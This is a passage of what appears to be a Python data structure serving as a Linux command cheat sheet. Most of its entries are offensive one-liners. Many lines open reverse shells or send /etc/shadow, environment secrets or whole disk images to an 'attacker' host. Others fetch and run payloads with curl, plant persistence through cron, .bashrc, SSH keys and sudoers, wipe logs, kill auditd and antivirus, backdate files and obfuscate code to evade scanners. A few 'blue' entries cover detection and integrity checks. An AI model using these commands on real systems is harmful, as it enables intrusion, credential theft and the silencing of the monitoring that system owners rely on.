            {"with": "grep",   "example": "xxd /bin/su | grep -i 'shadow\\|passwd'", "note": "Search binary for hardcoded references"},
            {"with": "nc",     "example": "xxd -p /etc/shadow | nc attacker 4444",   "note": "Exfiltrate file as hex over raw TCP"},
            {"with": "base64", "example": "xxd -p payload.bin | tr -d '\\n' | base64", "note": "Double-encode: hex then base64 for layered obfuscation"},
            {"with": "diff",   "example": "diff <(xxd original) <(xxd modified)",    "note": "Binary diff two files — spot single-byte patches in trojaned binaries"},
        ],
    },
    "dd": {
        "quick_use": [
            "dd if=/dev/sda of=/tmp/disk.img bs=4M      # clone disk to image",
            "dd if=/dev/zero of=/var/log/auth.log bs=1 count=$(stat -c%s /var/log/auth.log)  # zero-fill log",
            "dd if=/dev/urandom of=/tmp/noise bs=1M count=10  # generate random data",
        ],
        "combinations": [
            {"with": "gzip + nc", "example": "dd if=/dev/sda bs=4M | gzip | nc attacker 4445",         "note": "Stream full disk image to attacker — no temp file needed"},
            {"with": "sha256sum", "example": "dd if=/dev/sda bs=4M | tee disk.img | sha256sum",         "note": "Image and hash simultaneously — ensures integrity of forensic copy"},
            {"with": "split",     "example": "dd if=/dev/sda bs=512M | split -b 500M - /tmp/.chunk_",   "note": "Stream disk into 500MB chunks for upload limit bypass"},
            {"with": "xxd",       "example": "dd if=/dev/sda bs=512 count=1 | xxd",                     "note": "Inspect MBR — first 512 bytes show bootloader and partition table"},
        ],
    },
    "base64": {
        "quick_use": [
            "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | base64 -w0  # encode payload",
            "echo 'ENCODED' | base64 -d | bash                             # decode and execute",
            "base64 -w0 /etc/shadow | nc attacker 4444                     # encode file for exfil",
        ],
        "combinations": [
            {"with": "tr",     "example": "cat payload.sh | base64 | tr 'A-Za-z' 'N-ZA-Mn-za-m'",       "note": "ROT13 on top of base64 — two-layer obfuscation, breaks most signature scanners"},
            {"with": "xxd",    "example": "base64 -d encoded.txt | xxd | head",                          "note": "Decode and inspect binary payload before executing — safety check"},
            {"with": "curl",   "example": "curl -s http://attacker/shell | base64 -d | bash",            "note": "Download, decode, and execute in one pipeline — stageless delivery"},
            {"with": "openssl","example": "openssl enc -aes-256-cbc -base64 -in file -out file.enc -k pass", "note": "Encrypt + base64 in one step — harder to detect than plain base64"},
        ],
    },
    "mkfifo": {
        "quick_use": [
            "mkfifo /tmp/.pipe                          # create named pipe",
            "mkfifo /tmp/.f; nc 10.0.0.1 4444 </tmp/.f | /bin/sh >/tmp/.f 2>&1  # full reverse shell",
            "mkfifo /tmp/log; tee /tmp/log < /dev/stdin  # intercept stdin to a log",
        ],
        "combinations": [
            {"with": "nc",     "example": "mkfifo /tmp/.f; nc 10.0.0.1 4444 </tmp/.f | /bin/bash >/tmp/.f 2>&1", "note": "Classic named-pipe reverse shell — works when nc doesn't have -e flag"},
            {"with": "nohup",  "example": "nohup bash -c 'mkfifo /tmp/.f; nc 10.0.0.1 4444 </tmp/.f|/bin/sh>/tmp/.f 2>&1' &", "note": "Persists through session logout — combine with nohup for stable foothold"},
            {"with": "python3","example": "mkfifo /tmp/.f; python3 -c 'import os; os.dup2(open(\"/tmp/.f\",\"rb\").fileno(),0)' | /bin/sh >/tmp/.f", "note": "Python variant when nc is absent"},
            {"with": "tee",    "example": "mkfifo /tmp/p; tee /tmp/captured.log < /tmp/p > /tmp/p",     "note": "Intercept and log data flowing through the pipe — transparent MITM"},
        ],
    },
    "shred": {
        "quick_use": [
            "shred -vzu -n 3 /tmp/payload.sh            # overwrite 3x, zero, unlink",
            "shred -n 1 /var/log/auth.log               # single-pass log overwrite",
            "find /tmp -name '.*.sh' | xargs shred -zu  # shred all hidden scripts",
        ],
        "combinations": [
            {"with": "find",    "example": "find /tmp /var/tmp -name '.*' -type f | xargs shred -zu 2>/dev/null", "note": "Shred all hidden files in temp dirs in one sweep"},
            {"with": "truncate","example": "truncate -s 0 /var/log/auth.log && shred -n 1 /var/log/auth.log",     "note": "Truncate first (fast), then shred — belt and suspenders approach"},
            {"with": "dd",      "example": "shred -n 0 -z /tmp/file; dd if=/dev/zero of=/tmp/file bs=1k count=1", "note": "When shred is unavailable, dd with /dev/zero achieves similar effect"},
        ],
    },
    "truncate": {
        "quick_use": [
            "truncate -s 0 /var/log/auth.log            # silently empty auth log",
            "truncate -s 0 ~/.bash_history              # clear history file",
            "truncate -s 10G /tmp/bigfile               # create sparse large file (disk fill test)",
        ],
        "combinations": [
            {"with": "find",  "example": "find /var/log -name '*.log' | xargs truncate -s 0 2>/dev/null", "note": "Zero all log files in one command — faster than looping"},
            {"with": "tee",   "example": "truncate -s 0 /var/log/syslog; tee -a /var/log/syslog < /dev/null", "note": "Clear then monitor — watch for rsyslog restarting the file"},
            {"with": "inotifywait","example": "inotifywait -m /var/log/auth.log | while read; do truncate -s 0 /var/log/auth.log; done", "note": "Auto-clear on every write — persistent log suppression (blue: detect this pattern)"},
        ],
    },
    "echo": {
        "quick_use": [
            "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc  # inject into profile",
            "echo '* * * * * /tmp/.shell.sh' | crontab -                   # inject cron job",
            "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys              # add backdoor SSH key",
        ],
        "combinations": [
            {"with": "crontab", "example": "(crontab -l 2>/dev/null; echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1') | crontab -", "note": "Inject reverse shell into cron while preserving existing entries"},
            {"with": "tee",    "example": "echo 'PermitRootLogin yes' | tee -a /etc/ssh/sshd_config",   "note": "Append to system files — tee handles write to root-owned files if you have sudo"},
            {"with": "base64", "example": "echo 'aWQgPiAvdG1wL3Byb29m' | base64 -d > /tmp/.r.sh && chmod +x /tmp/.r.sh", "note": "Write encoded payload, decode on disk — hides content in process list"},
            {"with": "dd",     "example": "echo -n 'payload' | dd of=/dev/shm/.x bs=1 2>/dev/null; chmod +x /dev/shm/.x", "note": "/dev/shm is memory-only, survives as long as system is up, leaves no disk artifact"},
        ],
    },
    "nohup": {
        "quick_use": [
            "nohup ./beacon.sh &                        # run in background, survive logout",
            "nohup bash -c 'while true; do bash -i >& /dev/tcp/10.0.0.1/4444 0>&1; sleep 60; done' &",
            "nohup python3 -m http.server 8080 &        # persistent web server",
        ],
        "combinations": [
            {"with": "nice",   "example": "nohup nice -n 19 ./cryptominer &",                            "note": "Lowest priority + detached: survives logout and evades CPU spike detection"},
            {"with": "disown", "example": "nohup bash ./shell.sh & disown",                              "note": "disown removes it from job table — invisible to `jobs` command"},
            {"with": "stdbuf", "example": "nohup stdbuf -oL ./beacon.sh > /dev/null 2>&1 &",             "note": "Line-buffered output prevents buffered writes revealing timing patterns to IDS"},
            {"with": "timeout","example": "nohup timeout 3600 nc -e /bin/bash 10.0.0.1 4444 &",         "note": "Auto-terminates after 1h — useful for timed windows, limits exposure"},
        ],
    },
    "ln": {
        "quick_use": [
            "ln -sf /etc/shadow /tmp/shadow             # symlink to sensitive file",
            "ln -s /root/.ssh/id_rsa /tmp/key           # expose root SSH key",
            "ln /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash  # SUID copy of bash",
        ],
        "combinations": [
            {"with": "find",  "example": "find /tmp -maxdepth 1 -type l | xargs readlink -f",           "note": "Audit all symlinks in /tmp — detect planted symlinks during incident response"},
            {"with": "watch", "example": "while true; do ln -sf /etc/shadow /tmp/vuln_tmp 2>/dev/null; done &", "note": "Rapid symlink loop for TOCTOU race — plant before privileged process opens the file"},
            {"with": "chmod", "example": "ln /bin/bash /tmp/.b && chmod u+s /tmp/.b",                   "note": "Hard link SUID trick: if original loses SUID, hard link may retain it depending on kernel"},
        ],
    },
    "su": {
        "quick_use": [
            "su - root                                  # switch to root with full environment",
            "su -c 'cat /etc/shadow' root               # run single command as root",
            "su -s /bin/bash www-data                   # switch to service account",
        ],
        "combinations": [
            {"with": "find",    "example": "find / -perm -4000 2>/dev/null | xargs ls -la  # then try: su -c id root", "note": "SUID discovery chain — find the binary, test su escalation"},
            {"with": "script",  "example": "script /dev/null -c 'su root'",                              "note": "script allocates a pseudo-TTY — needed when su fails with 'must be run from a terminal'"},
            {"with": "python3", "example": "python3 -c 'import pty; pty.spawn(\"/bin/su\")'",            "note": "Spawn PTY first when su complains about terminal — common in web shells"},
        ],
    },
    "chroot": {
        "quick_use": [
            "chroot /mnt/recovery /bin/bash             # chroot into recovered system",
            "chroot /proc/1/root /bin/bash              # escape jail via /proc (if root in jail)",
            "chroot /var/www/html /bin/sh               # examine what web server sees as root",
        ],
        "combinations": [
            {"with": "mount",  "example": "mount --bind /proc /mnt/newroot/proc && chroot /mnt/newroot /bin/bash", "note": "Bind-mount /proc before chroot — needed for full environment (package management, etc.)"},
            {"with": "find",   "example": "chroot /mnt/recovered find / -name 'id_rsa' 2>/dev/null",    "note": "Search inside another system's filesystem from outside — forensics and IR"},
            {"with": "dd",     "example": "dd if=/dev/sda | gzip > disk.img.gz; mkdir /mnt/r; mount disk.img /mnt/r; chroot /mnt/r", "note": "Image → mount → chroot: full offline analysis of target disk"},
        ],
    },
    "runcon": {
        "quick_use": [
            "runcon -t initrc_t /bin/bash               # run bash in initrc_t context",
            "runcon system_u:system_r:unconfined_t:s0 /bin/bash  # unconfined context attempt",
            "runcon --compute /bin/id                   # compute and display allowed context",
        ],
        "combinations": [
            {"with": "sestatus","example": "sestatus && runcon -t initrc_t /bin/bash 2>/dev/null && echo 'escaped'", "note": "Check enforcement then attempt context escape — the full test sequence"},
            {"with": "chcon",   "example": "chcon -t bin_t /tmp/payload && runcon -t bin_t /tmp/payload", "note": "Relabel the file first, then execute in matching context — bypasses type enforcement"},
        ],
    },
    "chcon": {
        "quick_use": [
            "chcon -t bin_t /tmp/payload.sh             # relabel as executable binary type",
            "chcon -t user_home_t /etc/shadow           # mislabel sensitive file",
            "chcon --reference /bin/ls /tmp/evil        # copy label from trusted binary",
        ],
        "combinations": [
            {"with": "ls -Z",  "example": "ls -Z /tmp/payload && chcon -t bin_t /tmp/payload && ls -Z /tmp/payload", "note": "Before/after: verify the label actually changed"},
            {"with": "runcon", "example": "chcon -t initrc_t /tmp/shell.sh && runcon -t initrc_t /tmp/shell.sh", "note": "Matching label + context: file and executor must agree for the bypass to work"},
            {"with": "find",   "example": "find /tmp -type f | xargs chcon -t bin_t 2>/dev/null",       "note": "Bulk relabel all files in /tmp — useful after dropping multiple payloads"},
        ],
    },
    "grep": {
        "quick_use": [
            "grep -r 'password' /etc/ 2>/dev/null       # hunt credentials in configs",
            "grep -rn 'AKIA' /home/ 2>/dev/null         # find AWS access keys",
            "grep -iE '(pass|secret|token|key)' ~/.bash_history  # history credential search",
        ],
        "combinations": [
            {"with": "find",   "example": "find / -readable -type f 2>/dev/null | xargs grep -l 'password' 2>/dev/null", "note": "Find all readable files then search — complete credential sweep"},
            {"with": "sort + uniq", "example": "grep 'Failed password' /var/log/auth.log | grep -oP '(?<=from )[^ ]+' | sort | uniq -c | sort -rn | head", "note": "Top attacking IPs by failed login count — instant brute-force detection"},
            {"with": "tee",    "example": "grep -r 'api_key' /var/www/ 2>/dev/null | tee /tmp/creds.txt", "note": "Search and save simultaneously — grab before access is revoked"},
            {"with": "cut",    "example": "grep '^[^:]*:[^!*]' /etc/shadow | cut -d: -f1,2",           "note": "Extract only crackable hashes (no ! or *) with usernames for hashcat"},
        ],
    },
    "find": {
        "quick_use": [
            "find / -perm -4000 -type f 2>/dev/null     # all SUID binaries",
            "find / -writable -type d 2>/dev/null | grep -v proc  # writable directories",
            "find / -mtime -1 -type f 2>/dev/null | grep -v proc  # modified last 24h",
        ],
        "combinations": [
            {"with": "xargs",  "example": "find / -perm -4000 -type f 2>/dev/null | xargs ls -la",      "note": "Full details on all SUID binaries — check owners and dates"},
            {"with": "sha256sum","example": "find /bin /usr/bin -type f | xargs sha256sum > /root/baseline.sha256", "note": "Baseline all binaries — foundation of file integrity monitoring"},
            {"with": "grep",   "example": "find /etc -readable -name '*.conf' | xargs grep -l 'password' 2>/dev/null", "note": "Chain find→grep: find readable configs that contain passwords"},
            {"with": "exec",   "example": "find /tmp -name '*.sh' -exec chmod -x {} \\;",               "note": "Blue: strip execute from all scripts in /tmp in one command"},
            {"with": "newer",  "example": "find / -newer /tmp/.marker -not -path '/proc/*' -type f 2>/dev/null", "note": "Everything changed after your marker timestamp — catch attacker modifications"},
        ],
    },
    "cat": {
        "quick_use": [
            "cat /etc/passwd | cut -d: -f1,7            # users with their shells",
            "cat /proc/net/tcp                          # active TCP connections (hex ports)",
            "cat /root/.ssh/id_rsa 2>/dev/null          # root's private key",
        ],
        "combinations": [
            {"with": "base64", "example": "cat /etc/shadow | base64 | nc attacker 4444",                "note": "Encode and exfiltrate shadow file — base64 ensures safe ASCII transport"},
            {"with": "grep",   "example": "cat ~/.bash_history | grep -iE 'ssh|ftp|mysql|pass'",        "note": "Mine command history for credentials typed in previous sessions"},
            {"with": "awk",    "example": "cat /etc/passwd | awk -F: '$3==0{print $1}'",                "note": "Find all UID 0 accounts (root equivalents) — often reveals backdoor accounts"},
            {"with": "while",  "example": "cat /etc/hosts | while read line; do echo $line | grep -v '^#' && ping -c1 $(echo $line | awk '{print $2}') 2>/dev/null; done", "note": "Map hosts file to live IPs — quick internal network discovery"},
        ],
    },
    "tee": {
        "quick_use": [
            "tee -a /etc/sudoers <<< 'www-data ALL=(ALL) NOPASSWD:ALL'  # backdoor sudoers",
            "curl -s http://attacker/payload | tee /tmp/.p | bash        # download, log, execute",
            "nc attacker 4444 | tee /tmp/received | bash                 # intercept and execute",
        ],
        "combinations": [
            {"with": "sudo",   "example": "echo 'www-data ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers", "note": "Classic privilege: tee lets you write to root-owned files via sudo without a text editor"},
            {"with": "mkfifo", "example": "mkfifo /tmp/p; tee /tmp/logged < /tmp/p > /tmp/p",           "note": "Tap a named pipe: data flows through but also gets logged — transparent intercept"},
            {"with": "curl",   "example": "curl -s http://attacker/stager.sh | tee /dev/stderr | bash 2>/tmp/stager.log", "note": "Execute and log simultaneously — useful for debugging staged payloads"},
        ],
    },
    "printenv": {
        "quick_use": [
            "printenv | grep -iE 'pass|key|token|secret|api'  # credential sweep",
            "printenv PATH                               # check for path hijacking opportunities",
            "printenv | sort                             # full sorted env dump",
        ],
        "combinations": [
            {"with": "grep",   "example": "printenv | grep -iE '(AWS|GCP|AZURE|TOKEN|SECRET|KEY|PASS|DB_)' | tee /tmp/env_creds.txt", "note": "Complete cloud + DB credential sweep — works well in containers"},
            {"with": "base64", "example": "printenv | base64 | nc attacker 4444",                       "note": "Exfiltrate full environment — attacker decodes for complete picture"},
            {"with": "awk",    "example": "printenv | awk -F= '/PASS|SECRET|KEY/{print $0}'",           "note": "awk variant — handles values containing = (common in base64 tokens)"},
        ],
    },
    "sort": {
        "quick_use": [
            "sort -u /tmp/found_ips.txt                 # deduplicate IP list",
            "sort -t: -k3 -n /etc/passwd               # sort users by UID",
            "sort -rh <(du -sh /var/log/*)             # largest log files first",
        ],
        "combinations": [
            {"with": "uniq -c","example": "grep 'Failed' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -20", "note": "Top brute-forcing IPs — the standard auth log analysis pipeline"},
            {"with": "comm",   "example": "sort /root/baseline_files.txt > /tmp/a.txt; find /bin -type f | sort > /tmp/b.txt; comm -13 /tmp/a.txt /tmp/b.txt", "note": "New files in /bin since baseline — comm needs sorted input, sort provides it"},
            {"with": "diff",   "example": "diff <(sort old_hashes.txt) <(sort new_hashes.txt)",         "note": "Compare hash sets order-independently — find changed/added/removed files"},
        ],
    },
    "cut": {
        "quick_use": [
            "cut -d: -f1,6,7 /etc/passwd               # username, home, shell",
            "cut -d: -f1,2 /etc/shadow 2>/dev/null     # username + hash",
            "cut -d'\"' -f2 /var/www/config.php        # extract quoted values from PHP config",
        ],
        "combinations": [
            {"with": "grep + sort","example": "grep 'Accepted' /var/log/auth.log | cut -d' ' -f9,11 | sort -u", "note": "Unique successful login username+IP pairs — who authenticated from where"},
            {"with": "awk",    "example": "cat /etc/passwd | cut -d: -f1,3 | awk -F: '$2<1000{print $1\" (system)\"}'", "note": "List system accounts (UID < 1000) — identify service accounts for lateral movement"},
            {"with": "base64", "example": "cut -d: -f2 /etc/shadow | grep -v '!\\|\\*' | base64 | nc attacker 4444", "note": "Extract and exfiltrate only crackable hashes"},
        ],
    },
    "who": {
        "quick_use": [
            "who -a                                     # all sessions with boot time and runlevel",
            "who | awk '{print $1, $5}'                 # user + login time",
            "who am i                                   # your own session details",
        ],
        "combinations": [
            {"with": "awk",    "example": "who | awk '{print $1}' | sort -u",                           "note": "List unique logged-in users — quick session headcount"},
            {"with": "kill",   "example": "who | awk '{print $2}' | xargs -I{} pkill -t {}",           "note": "Blue: kill all terminal sessions — emergency lockout of all interactive users"},
            {"with": "last",   "example": "who; echo '---'; last -n 10",                                "note": "Current + recent: compare who is logged in now vs who logged in recently"},
        ],
    },
    "top": {
        "quick_use": [
            "top -b -n 1 | head -30                    # one-shot non-interactive snapshot",
            "top -b -n 1 -o %CPU | grep -v '^$' | head -20  # top CPU consumers",
            "top -b -n 1 -u www-data                   # processes by specific user",
        ],
        "combinations": [
            {"with": "grep",   "example": "top -b -n 1 | grep -vE 'top|Tasks|%Cpu|KiB|PID' | awk '$9>50{print}'", "note": "Processes using >50% CPU — cryptominer detector"},
            {"with": "kill",   "example": "top -b -n 1 -o %CPU | awk 'NR>7 && $9>80{print $1}' | xargs kill -9 2>/dev/null", "note": "Auto-kill anything over 80% CPU — emergency response to cryptominer"},
            {"with": "tee",    "example": "top -b -d 5 | tee /var/log/process_monitor.log",             "note": "Continuous process monitoring with logging — run in tmux for persistent IR visibility"},
        ],
    },
    "chmod": {
        "quick_use": [
            "chmod u+s /tmp/bash_copy                  # set SUID on bash copy (needs root)",
            "chmod 000 /etc/shadow                     # extreme restriction (blue: lockdown)",
            "chmod -R o-rwx /var/www/secrets/          # remove world permissions recursively",
        ],
        "combinations": [
            {"with": "find",   "example": "find / -perm -4000 2>/dev/null | xargs chmod -s 2>/dev/null", "note": "Blue: strip SUID from all non-essential binaries in one sweep — major hardening step"},
            {"with": "install","example": "install -m 750 -o root -g wheel /tmp/script.sh /usr/local/bin/script.sh", "note": "install sets permissions atomically — safer than cp then chmod"},
            {"with": "stat",   "example": "stat -c '%a %n' /etc/shadow /etc/passwd /etc/sudoers",       "note": "Audit permissions on critical files — check against known-good values"},
        ],
    },
    "sha256sum": {
        "quick_use": [
            "sha256sum /bin/bash /bin/ls /usr/bin/sudo  # spot-check critical binaries",
            "sha256sum -c /root/baseline.sha256 2>/dev/null | grep FAILED  # integrity check",
            "find /bin /usr/bin -type f | xargs sha256sum > baseline.sha256  # create baseline",
        ],
        "combinations": [
            {"with": "find",   "example": "find /bin /sbin /usr/bin -type f | xargs sha256sum | tee /root/baseline.sha256", "note": "Full binary hash baseline — run after clean install, compare monthly"},
            {"with": "comm",   "example": "sha256sum -c baseline.sha256 2>&1 | grep FAILED | cut -d: -f1 | sort > /tmp/changed.txt; comm -13 /tmp/changed.txt <(find /bin -type f | sort)", "note": "Full change detection: which hashes changed + which files are new"},
            {"with": "diff",   "example": "diff <(sha256sum /bin/* 2>/dev/null | sort) <(cat /root/baseline.sha256 | grep '/bin/' | sort)", "note": "Visual diff of current vs baseline — easy to spot a single trojan'd binary"},
        ],
    },
    "tail": {
        "quick_use": [
            "tail -f /var/log/auth.log | grep -i failed  # live failed login stream",
            "tail -f /var/log/nginx/access.log | grep ' 200 '  # live successful requests",
            "tail -n 50 /var/log/syslog               # last 50 syslog lines",
        ],
        "combinations": [
            {"with": "grep",   "example": "tail -f /var/log/auth.log | grep --line-buffered -iE 'failed|invalid|error|sudo'", "note": "--line-buffered critical: without it, grep buffers output and you miss real-time events"},
            {"with": "awk",    "example": "tail -f /var/log/nginx/access.log | awk '$9==200{print $1, $7}'", "note": "Real-time successful request monitoring — watch for scanning patterns"},
            {"with": "tee",    "example": "tail -f /var/log/auth.log | tee /tmp/session_log.txt | grep -i sudo", "note": "Monitor and capture: see sudo events live, keep full log for report"},
        ],
    },
    "comm": {
        "quick_use": [
            "comm -13 <(sort old.txt) <(sort new.txt)  # lines only in new.txt",
            "comm -23 <(sort current.txt) <(sort baseline.txt)  # files removed since baseline",
            "comm -12 <(sort list1.txt) <(sort list2.txt)  # common lines",
        ],
        "combinations": [
            {"with": "find + sort","example": "comm -13 <(find /bin -type f | sort) <(find /bin -type f | sort) ", "note": "Template: replace first find with saved baseline list to detect added binaries"},
            {"with": "sha256sum","example": "comm -13 <(cut -d' ' -f3 baseline.sha256 | sort) <(find /bin -type f | sort)", "note": "Find files present now but not in the hash baseline — newly added binaries"},
        ],
    },
    "stty": {
        "quick_use": [
            "stty raw -echo; fg                        # TTY upgrade step 2 after Ctrl+Z",
            "stty -a                                   # show all terminal settings",
            "stty size                                 # get terminal dimensions",
        ],
        "combinations": [
            {"with": "python3","example": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'; stty raw -echo; fg", "note": "Full TTY upgrade sequence — required for interactive tools in reverse shells"},
            {"with": "script", "example": "script /dev/null -c bash; stty raw -echo; fg",               "note": "script-based TTY alternative when python3 unavailable"},
        ],
    },
    "tr": {
        "quick_use": [
            "echo 'hello' | tr 'a-z' 'A-Z'            # uppercase",
            "cat payload.sh | tr -d '\\n'              # remove newlines (single-line payload)",
            "echo 'secret' | tr 'A-Za-z' 'N-ZA-Mn-za-m'  # ROT13",
        ],
        "combinations": [
            {"with": "base64", "example": "echo 'id' | base64 | tr 'A-Za-z' 'N-ZA-Mn-za-m'",           "note": "Base64 + ROT13 = two-layer encoding most signature scanners miss"},
            {"with": "xxd",    "example": "cat /etc/shadow | xxd -p | tr -d '\\n' | nc attacker 4444",  "note": "Hex-encode shadow file, strip newlines, exfil in one pipeline"},
            {"with": "cut",    "example": "cat /etc/passwd | tr ':' '\\t' | cut -f1,7",                 "note": "Translate delimiter then cut — sometimes easier than awk for simple fields"},
        ],
    },
    "seq": {
        "quick_use": [
            "seq 1 254 | xargs -I{} ping -c1 -W1 192.168.1.{} 2>/dev/null | grep '64 bytes'  # ping sweep",
            "seq 1 1024 | xargs -I{} nc -z -w1 192.168.1.1 {} 2>/dev/null && echo open  # port scan",
            "seq 0 255 | xargs printf '192.168.1.%d\\n'  # generate IP list",
        ],
        "combinations": [
            {"with": "nc",     "example": "seq 20 1024 | xargs -P20 -I{} bash -c 'nc -z -w1 target {} 2>/dev/null && echo \"port {} open\"'", "note": "Parallel port scan — -P20 runs 20 probes simultaneously for speed"},
            {"with": "xargs",  "example": "seq 1 254 | xargs -P50 -I{} bash -c 'ping -c1 -W1 10.0.0.{} &>/dev/null && echo \"10.0.0.{} alive\"'", "note": "50-parallel ping sweep — maps a /24 in seconds using only built-in tools"},
            {"with": "shuf",   "example": "seq 1 65535 | shuf | head -200 | sort -n | xargs -I{} nc -z -w1 target {}  2>/dev/null", "note": "Randomized port scan sample — avoids sequential scan detection"},
        ],
    },
    "shuf": {
        "quick_use": [
            "shuf wordlist.txt | head -1000            # random 1000 from wordlist",
            "shuf -n 5 /etc/passwd                     # 5 random users",
            "shuf -i 1024-65535 -n 1                   # random high port number",
        ],
        "combinations": [
            {"with": "seq",    "example": "shuf <(seq 1 65535) | xargs -I{} nc -z -w1 target {}  2>/dev/null", "note": "Full port scan in random order — defeats sequential scan rate-limiting"},
            {"with": "head + nc","example": "shuf wordlist.txt | while read pass; do echo -n '.'; echo $pass | su -c id root 2>/dev/null && echo \"\\nFound: $pass\" && break; done", "note": "Randomized password brute-force — slower but avoids lockout-by-sequence"},
        ],
    },
    "nice": {
        "quick_use": [
            "nice -n 19 ./cryptominer &                # run at minimum CPU priority",
            "nice -n -20 ./critical_process &          # run at maximum priority (needs root)",
            "renice +10 -p $(pgrep suspicious_proc)    # lower priority of running process",
        ],
        "combinations": [
            {"with": "nohup",  "example": "nohup nice -n 19 bash -c 'while true; do nc -e /bin/bash attacker 4444; sleep 30; done' &", "note": "Persistent low-priority beacon — survives logout, won't trigger CPU alerts"},
            {"with": "ionice", "example": "nice -n 19 ionice -c 3 ./exfil_script.sh",                   "note": "CPU + IO both at lowest priority — exfil without impacting system performance"},
            {"with": "stdbuf", "example": "nice -n 19 stdbuf -oL ./beacon.sh > /dev/null 2>&1 &",       "note": "Low priority + line buffering: timing-based detection also defeated"},
        ],
    },
    "kill": {
        "quick_use": [
            "kill -9 $(pgrep auditd)                   # kill audit daemon (needs root)",
            "kill -9 $(pgrep -f 'intrusion\\|av\\|clamav')  # kill security tools",
            "pkill -u victim_user                      # kill all processes of a user",
        ],
        "combinations": [
            {"with": "ps",     "example": "ps aux | grep -iE 'clamav|aide|auditd|ossec|falco' | awk '{print $2}' | xargs kill -9 2>/dev/null", "note": "One-liner: find and kill common security monitoring tools"},
            {"with": "top",    "example": "top -b -n1 | awk 'NR>7 && $9>90{print $1}' | xargs kill -9 2>/dev/null", "note": "Kill everything over 90% CPU — emergency response to cryptominer or fork bomb"},
            {"with": "nohup",  "example": "# blue: if kill doesn't stop it, check nohup.out and parent processes:\nps auxf | grep [suspicious_cmd]  # show full process tree", "note": "A process that restarts after kill has a supervisor — look for cron, systemd, or nohup loops"},
        ],
    },
    "timeout": {
        "quick_use": [
            "timeout 5 nc -z target 22 && echo open    # port check with timeout",
            "timeout 30 bash exploit.sh                # limit exploit runtime",
            "timeout 3 ping -c1 target &>/dev/null && echo alive  # timed ping",
        ],
        "combinations": [
            {"with": "xargs",  "example": "cat hosts.txt | xargs -P20 -I{} bash -c 'timeout 2 nc -z {} 22 2>/dev/null && echo \"{} SSH open\"'", "note": "Mass SSH reachability check — 20 parallel 2-second probes"},
            {"with": "while",  "example": "while true; do timeout 5 bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'; sleep 60; done", "note": "Reconnecting beacon: timeout kills stale connections, loop retries — more reliable than nohup alone"},
            {"with": "sleep",  "example": "timeout 7200 bash -c 'while true; do [attack commands]; sleep 3600; done'", "note": "Self-terminating attack loop — runs for max 2 hours then stops, reduces detection window"},
        ],
    },
    "date": {
        "quick_use": [
            "date -s '2020-01-01 00:00:00'             # set system time back (needs root)",
            "date +%s                                  # Unix timestamp (for scripting)",
            "date --date='1 hour ago' +'%Y-%m-%d %H:%M'  # formatted past time",
        ],
        "combinations": [
            {"with": "touch",  "example": "touch -t $(date -d '7 days ago' +'%Y%m%d%H%M') /tmp/payload.sh", "note": "Backdating files: make payload look like it's been there a week — confuses timeline analysis"},
            {"with": "find",   "example": "find / -newer /tmp/.marker -not -path '/proc/*' 2>/dev/null; touch -t $(date -d 'now' +'%Y%m%d%H%M') /tmp/.marker", "note": "Rolling window: find everything changed since last marker, then update marker"},
            {"with": "faketime","example": "faketime '2020-01-01 12:00:00' ./signed_binary",             "note": "faketime (external tool) alters time for a specific process — bypasses time-based license checks and log timestamps"},
        ],
    },
    "which": {
        "quick_use": [
            "which python python3 perl ruby nc ncat curl wget  # discovery sweep",
            "which gcc g++ make                        # can we compile exploits?",
            "which awk sed sort uniq                   # scripting tools available?",
        ],
        "combinations": [
            {"with": "for loop","example": "for tool in nc ncat socat python3 ruby perl curl wget; do which $tool 2>/dev/null && echo \"$tool available\"; done", "note": "Systematic tool discovery — determines exfil and shell methods"},
            {"with": "xargs",  "example": "echo 'nc ncat python3 perl ruby' | tr ' ' '\\n' | xargs which 2>/dev/null", "note": "Compact form — same discovery in one pipeline"},
        ],
    },
    "stat": {
        "quick_use": [
            "stat /etc/shadow /etc/passwd /etc/sudoers  # audit sensitive file metadata",
            "stat -c '%y %n' /bin/bash /usr/bin/sudo   # last modification times",
            "stat -c '%a %u %g %n' /tmp/*              # permissions + owner on all /tmp files",
        ],
        "combinations": [
            {"with": "find",   "example": "find /bin /usr/bin -type f | xargs stat -c '%Y %n' | sort -n | tail -10", "note": "Most recently modified binaries — a brand-new mtime on /bin/ls is a red flag"},
            {"with": "diff",   "example": "stat -c '%a %U %G %n' /etc/sudoers > /tmp/sudoers_stat.txt; # later: diff /tmp/sudoers_stat.txt <(stat -c '%a %U %G %n' /etc/sudoers)", "note": "Track permission changes on critical files over time"},
        ],
    },
    "realpath": {
        "quick_use": [
            "realpath /tmp/suspicious_link             # where does it actually point?",
            "realpath .                                # full path of current directory",
            "realpath /proc/1/exe                      # path of init process binary",
        ],
        "combinations": [
            {"with": "find",   "example": "find /tmp -type l | xargs realpath 2>/dev/null | grep -v '^/tmp'", "note": "Find symlinks in /tmp pointing outside /tmp — symlink attacks almost always go elsewhere"},
            {"with": "xargs",  "example": "ls /tmp/ | xargs -I{} realpath /tmp/{} 2>/dev/null",        "note": "Resolve all paths in /tmp — catches anything that escaped the directory"},
        ],
    },
    "du": {
        "quick_use": [
            "du -sh /* 2>/dev/null | sort -rh | head   # top-level disk usage",
            "du -sh /home/*                            # per-user storage (find data hoarders)",
            "du -sh /var/log/*                         # log file sizes",
        ],
        "combinations": [
            {"with": "find",   "example": "du -sh $(find /home /opt /var -maxdepth 3 -type d 2>/dev/null) | sort -rh | head -20", "note": "Find the richest directories for exfiltration targeting"},
            {"with": "sort",   "example": "du -ah /var/www/ 2>/dev/null | sort -rh | head -20",        "note": "Largest files in web root — databases, backups, and archives are top targets"},
            {"with": "awk",    "example": "du -sb /home/* 2>/dev/null | awk '$1 > 1000000000 {print \"Large: \" $2}'", "note": "Flag home directories over 1GB — staged exfil data or sensitive archives"},
        ],
    },
    "split": {
        "quick_use": [
            "split -b 500k archive.tgz /tmp/.chunk_   # chunk into 500KB pieces",
            "cat /tmp/.chunk_* > recovered.tgz         # reassemble",
